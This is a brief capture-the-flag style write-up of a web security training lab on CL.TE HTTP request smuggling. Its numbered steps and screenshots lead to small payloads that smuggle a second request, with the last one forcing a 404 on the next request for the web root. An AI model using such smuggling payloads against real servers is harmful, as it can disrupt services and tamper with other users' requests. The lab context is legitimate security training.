# HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

## This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

## To solve the lab, smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response.

---

### step 1

change post request to get request
change protocol from HTTP/2 to HTTP/1.1

![screenshot](./images/images_lab4/lab4_homepage_with_post_request.png)

### step2

![screenshot](./images/images_lab4/lab4_add_payload_for_lab1.png)

### step3

![screenshot](./images/images_lab4/lab4_proxy_error.png)

### step4

![screenshot](./images/images_lab4/lab4_payload_ce_te.png)

### step5

content-Length update must be unmarked

![screenshot](./images/images_lab4/lab4_uncheck_content_length.png)

### step6

test payload

```
e
q=smuggling&x=
0

GET /post?postId=5 HTTP/1.1
Foo: x
```

![screenshot](./images/images_lab4/lab4_test_payload_to_display_post.png)

### step7

test payload

```
0

GET /post?postId=5 HTTP/1.1
Foo: x
```

![screenshot](./images/images_lab4/lab4_payloadfor_post.png)

### step8

final payload to solve lab

```
0

GET /404 HTTP/1.1
Foo: x
```

![screenshot](./images/images_lab4/lab4_404_request_payload.png)

### step9

lab solved

![screenshot](./images/images_lab4/lab4_lab_solved.png)
